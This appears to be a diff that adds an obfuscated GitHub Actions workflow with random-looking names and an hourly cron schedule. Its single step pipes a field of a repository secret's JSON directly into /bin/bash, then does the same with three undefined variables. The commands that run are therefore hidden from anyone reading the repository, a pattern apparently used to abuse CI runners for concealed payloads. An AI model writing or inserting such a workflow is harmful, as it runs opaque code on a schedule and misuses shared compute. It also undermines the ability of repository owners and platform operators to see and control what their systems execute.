@@ -1,0 +1,22 @@
+name: longaodi2374
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: longaodi2374
+        env:
+          tpd03: ${{ secrets.tpd03 }}
+        run: |
+          echo $tpd03 | jq -r .vmx39 | /bin/bash
+          echo $pnuc39 | jq -r .gz15 | /bin/bash
+          echo $ogp77861 | jq -r .nzmv3556 | /bin/bash
+          echo $iox16 | jq -r .evtb551 | /bin/bash
+
